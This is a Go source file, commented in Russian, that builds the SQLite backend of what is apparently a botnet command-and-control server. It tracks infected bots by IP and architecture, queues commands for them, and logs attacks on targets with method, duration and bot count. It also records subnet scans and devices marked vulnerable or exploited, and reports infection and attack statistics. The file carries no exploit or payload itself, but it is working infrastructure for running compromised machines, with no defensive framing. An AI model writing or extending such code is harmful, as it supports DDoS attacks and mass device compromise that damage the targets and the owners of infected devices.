package main

import (
    "database/sql"
    "log"
    "time"
    _ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

func initDB() error {
    var err error
    db, err = sql.Open("sqlite3", "./c2.db")
    if err != nil {
        return err
    }

    // Создаем таблицы
    err = createTables()
    if err != nil {
        return err
    }

    // Создаем индексы
    err = createIndexes()
    if err != nil {
        return err
    }

    log.Println("[+] Database initialized successfully")
    return nil
}

func createTables() error {
    tables := []string{
        // Таблица ботов
        `CREATE TABLE IF NOT EXISTS bots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE NOT NULL,
            arch TEXT,
            os TEXT,
            uptime INTEGER DEFAULT 0,
            infected INTEGER DEFAULT 0,
            last_seen DATETIME,
            is_active BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,

        // Таблица команд
        `CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_ip TEXT NOT NULL,
            command TEXT NOT NULL,
            status TEXT DEFAULT 'pending', -- pending, executing, completed, failed
            result TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            completed_at DATETIME,
            FOREIGN KEY (bot_ip) REFERENCES bots (ip) ON DELETE CASCADE
        )`,

        // Таблица атак
        `CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT NOT NULL,
            method TEXT NOT NULL,
            duration INTEGER,
            bots_count INTEGER,
            status TEXT DEFAULT 'preparing', -- preparing, running, completed, failed
            started_at DATETIME,
            completed_at DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,

        // Таблица сканирований
        `CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            subnet TEXT NOT NULL,
            scanner_ip TEXT,
            found_hosts INTEGER DEFAULT 0,
            found_vuln INTEGER DEFAULT 0,
            status TEXT DEFAULT 'running',
            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            completed_at DATETIME
        )`,

        // Таблица найденных устройств
        `CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT NOT NULL,
            port INTEGER,
            service TEXT,
            banner TEXT,
            vuln_status TEXT, -- vulnerable, exploited, patched
            exploited_at DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,

        // Таблица пользователей веб-панели
        `CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'user', -- admin, user, viewer
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,

        // Таблица логов
        `CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            level TEXT, -- info, warning, error, critical
            source TEXT,
            message TEXT,
            details TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,

        // Таблица конфигураций
        `CREATE TABLE IF NOT EXISTS configs (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,
    }

    for _, tableSQL := range tables {
        _, err := db.Exec(tableSQL)
        if err != nil {
            return err
        }
    }

    return nil
}

func createIndexes() error {
    indexes := []string{
        "CREATE INDEX IF NOT EXISTS idx_bots_active ON bots(is_active)",
        "CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen)",
        "CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)",
        "CREATE INDEX IF NOT EXISTS idx_commands_bot_ip ON commands(bot_ip)",
        "CREATE INDEX IF NOT EXISTS idx_attacks_status ON attacks(status)",
        "CREATE INDEX IF NOT EXISTS idx_devices_vuln ON devices(vuln_status)",
    }

    for _, indexSQL := range indexes {
        _, err := db.Exec(indexSQL)
        if err != nil {
            return err
        }
    }

    return nil
}

// Функции для работы с ботами
func saveBot(bot *Bot) error {
    _, err := db.Exec(`
        INSERT OR REPLACE INTO bots 
        (ip, arch, os, uptime, infected, last_seen, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    `, bot.IP, bot.Arch, bot.OS, bot.Uptime, bot.Infected, time.Now(), true)
    
    return err
}

func getBot(ip string) (*Bot, error) {
    var bot Bot
    err := db.QueryRow(`
        SELECT ip, arch, os, uptime, infected, last_seen, is_active
        FROM bots WHERE ip = ?
    `, ip).Scan(&bot.IP, &bot.Arch, &bot.OS, &bot.Uptime, &bot.Infected, &bot.LastSeen, &bot.IsActive)
    
    if err != nil {
        return nil, err
    }
    
    return &bot, nil
}

func getActiveBots() ([]Bot, error) {
    rows, err := db.Query(`
        SELECT ip, arch, os, uptime, infected, last_seen, is_active
        FROM bots WHERE is_active = 1
        ORDER BY last_seen DESC
    `)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var bots []Bot
    for rows.Next() {
        var bot Bot
        err := rows.Scan(&bot.IP, &bot.Arch, &bot.OS, &bot.Uptime, 
                        &bot.Infected, &bot.LastSeen, &bot.IsActive)
        if err != nil {
            continue
        }
        bots = append(bots, bot)
    }

    return bots, nil
}

func updateBotStatus(ip string, isActive bool) error {
    _, err := db.Exec(`
        UPDATE bots 
        SET is_active = ?, last_seen = ?
        WHERE ip = ?
    `, isActive, time.Now(), ip)
    
    return err
}

func cleanupInactiveBots(timeoutHours int) (int64, error) {
    cutoff := time.Now().Add(-time.Duration(timeoutHours) * time.Hour)
    result, err := db.Exec(`
        UPDATE bots 
        SET is_active = 0 
        WHERE last_seen < ?
    `, cutoff)
    
    if err != nil {
        return 0, err
    }
    
    return result.RowsAffected()
}

// Функции для команд
func addCommand(botIP, command string) (int64, error) {
    result, err := db.Exec(`
        INSERT INTO commands (bot_ip, command, status, created_at)
        VALUES (?, ?, 'pending', ?)
    `, botIP, command, time.Now())
    
    if err != nil {
        return 0, err
    }
    
    return result.LastInsertId()
}

func getPendingCommands(botIP string) ([]string, error) {
    rows, err := db.Query(`
        SELECT command FROM commands 
        WHERE bot_ip = ? AND status = 'pending'
        ORDER BY created_at ASC
    `, botIP)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var commands []string
    for rows.Next() {
        var cmd string
        rows.Scan(&cmd)
        commands = append(commands, cmd)
    }

    return commands, nil
}

func markCommandExecuted(cmdID int64) error {
    _, err := db.Exec(`
        UPDATE commands 
        SET status = 'executing'
        WHERE id = ?
    `, cmdID)
    
    return err
}

func completeCommand(cmdID int64, result string, success bool) error {
    status := "completed"
    if !success {
        status = "failed"
    }
    
    _, err := db.Exec(`
        UPDATE commands 
        SET status = ?, result = ?, completed_at = ?
        WHERE id = ?
    `, status, result, time.Now(), cmdID)
    
    return err
}

// Функции для статистики
func getStats() (map[string]interface{}, error) {
    stats := make(map[string]interface{})
    
    // Общее количество ботов
    var totalBots int
    err := db.QueryRow("SELECT COUNT(*) FROM bots").Scan(&totalBots)
    if err != nil {
        return nil, err
    }
    stats["total_bots"] = totalBots
    
    // Активные боты
    var activeBots int
    err = db.QueryRow("SELECT COUNT(*) FROM bots WHERE is_active = 1").Scan(&activeBots)
    if err != nil {
        return nil, err
    }
    stats["active_bots"] = activeBots
    
    // Всего зараженных устройств
    var totalInfected sql.NullInt64
    err = db.QueryRow("SELECT SUM(infected) FROM bots").Scan(&totalInfected)
    if err != nil {
        return nil, err
    }
    stats["total_infected"] = totalInfected.Int64
    
    // Количество атак за сегодня
    var attacksToday int
    today := time.Now().Format("2006-01-02")
    err = db.QueryRow(`
        SELECT COUNT(*) FROM attacks 
        WHERE DATE(started_at) = ?
    `, today).Scan(&attacksToday)
    if err != nil {
        return nil, err
    }
    stats["attacks_today"] = attacksToday
    
    // Среднее время аптайма
    var avgUptime sql.NullFloat64
    err = db.QueryRow(`
        SELECT AVG(uptime) FROM bots 
        WHERE is_active = 1 AND uptime > 0
    `).Scan(&avgUptime)
    if err != nil {
        return nil, err
    }
    stats["avg_uptime"] = avgUptime.Float64
    
    // Распределение по архитектурам
    archStats := make(map[string]int)
    rows, err := db.Query(`
        SELECT arch, COUNT(*) 
        FROM bots 
        WHERE arch IS NOT NULL 
        GROUP BY arch
    `)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    for rows.Next() {
        var arch string
        var count int
        rows.Scan(&arch, &count)
        archStats[arch] = count
    }
    stats["arch_distribution"] = archStats
    
    // Последние 5 активных ботов
    recentBots, err := getRecentBots(5)
    if err == nil {
        stats["recent_bots"] = recentBots
    }
    
    // Активные атаки
    var activeAttacks int
    err = db.QueryRow(`
        SELECT COUNT(*) FROM attacks 
        WHERE status = 'running'
    `).Scan(&activeAttacks)
    if err != nil {
        return nil, err
    }
    stats["active_attacks"] = activeAttacks
    
    return stats, nil
}

func getRecentBots(limit int) ([]Bot, error) {
    rows, err := db.Query(`
        SELECT ip, arch, os, uptime, infected, last_seen, is_active
        FROM bots 
        ORDER BY last_seen DESC 
        LIMIT ?
    `, limit)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var bots []Bot
    for rows.Next() {
        var bot Bot
        err := rows.Scan(&bot.IP, &bot.Arch, &bot.OS, &bot.Uptime, 
                        &bot.Infected, &bot.LastSeen, &bot.IsActive)
        if err != nil {
            continue
        }
        bots = append(bots, bot)
    }

    return bots, nil
}

// Функции для логов
func addLog(level, source, message, details string) error {
    _, err := db.Exec(`
        INSERT INTO logs (level, source, message, details)
        VALUES (?, ?, ?, ?)
    `, level, source, message, details)
    
    return err
}

func getLogs(limit int, level string) ([]map[string]interface{}, error) {
    query := "SELECT level, source, message, details, created_at FROM logs"
    args := []interface{}{}
    
    if level != "" {
        query += " WHERE level = ?"
        args = append(args, level)
    }
    
    query += " ORDER BY created_at DESC LIMIT ?"
    args = append(args, limit)
    
    rows, err := db.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var logs []map[string]interface{}
    for rows.Next() {
        var level, source, message, details string
        var createdAt time.Time
        
        rows.Scan(&level, &source, &message, &details, &createdAt)
        
        logEntry := map[string]interface{}{
            "level": level,
            "source": source,
            "message": message,
            "details": details,
            "created_at": createdAt.Format("2006-01-02 15:04:05"),
        }
        
        logs = append(logs, logEntry)
    }

    return logs, nil
}

// Закрытие БД
func closeDB() {
    if db != nil {
        db.Close()
    }
}